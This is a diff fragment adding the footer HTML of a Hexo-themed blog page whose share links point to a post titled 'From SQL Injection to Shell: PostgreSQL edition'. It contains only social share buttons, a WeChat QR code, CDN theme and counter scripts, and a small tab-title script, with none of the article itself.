+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2015/04/09/From-SQL-Injection-to-Shell-PostgreSQL-edition/&title=《From SQL Injection to Shell: PostgreSQL edition》 — 喵喵喵喵&source=安全研究，懒，基本不自己写" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2015/04/09/From-SQL-Injection-to-Shell-PostgreSQL-edition/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《From SQL Injection to Shell: PostgreSQL edition》 — 喵喵喵喵&url=https://darkwing.moe/2015/04/09/From-SQL-Injection-to-Shell-PostgreSQL-edition/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2015/04/09/From-SQL-Injection-to-Shell-PostgreSQL-edition/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACuElEQVR42u3awYrjMBAE0Pn/n56FPS0Ljqu6rSSH59MQHNlPA+pOST8/8fX797r65Pef6+qT13e+fsrVaI9deHh4eKNXv7pyzOyJyTu09+Ph4eG9h/e6GCSLfvLd16O9fpNkQvHw8PC+jTdb0NvWeTZleHh4eN/JaxvxWZCRFyc8PDy8z/LyH/95IFtEBmXIeyRrwcPDw+tGLjbAvuHvg/t7eHh4eItd9faajZm/ej0yHh4e3gFeHqG24cVmOy2JNoqpwcPDw3uUt9nQao9VPRXO5iUEDw8P7xxvE6FutsfyQpLgL5tpPDw8vEd5yXB7ZNs6P7athYeHh3eA1wYBswX6dayQL/Ht9OHh4eGd4M0e0wa1m6iixd/8bsDDw8Nb89q4dhMotNHDLJgozhrg4eHhLXjDYLQMcPN78tj3JkDBw8PDO8bbL/RJTDBbsdspiE5G4OHh4a15bQjbFoz8KFV758274eHh4b2R18avyZbVDDwLU+r5w8PDw+uSgSPxaxtJJAUg+S4eHh7eZ3lt09yWlll0+0B5wMPDw3uIlzfKG97sWEASjty8Mx4eHt6jvCQyyIdLItd9mz78v+Hh4eGteZvt+bZIJM9Kgoa8ycbDw8N7D2/TyOaLe1sA2hgCDw8P7xwv32pKkPuNsST+SLbE8PDw8E7z8oW+3dqfhQjtIYM6LcbDw8Nb89rcd7MxNosqVmUJDw8P7+28fAraKLYNOPIqgIeHh3eO91tes8ggb5rzQ2DRaHh4eHgHeJuoYnZcYNaCz4oTHh4e3jnerNndz2US/uaF4fJZeHh4eMd4+wNS+4Ixq103ETAeHh7eF/BmLe/sSFZeJG5aajw8PLwP8WaLeN5w5+FFHUbg4eHhHeBtmuP21dsysEqj8fDw8A7wNhtgeevcHj5oW/Mj+3t4eHh4/4/5Bxy6Ihbcy+8tAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
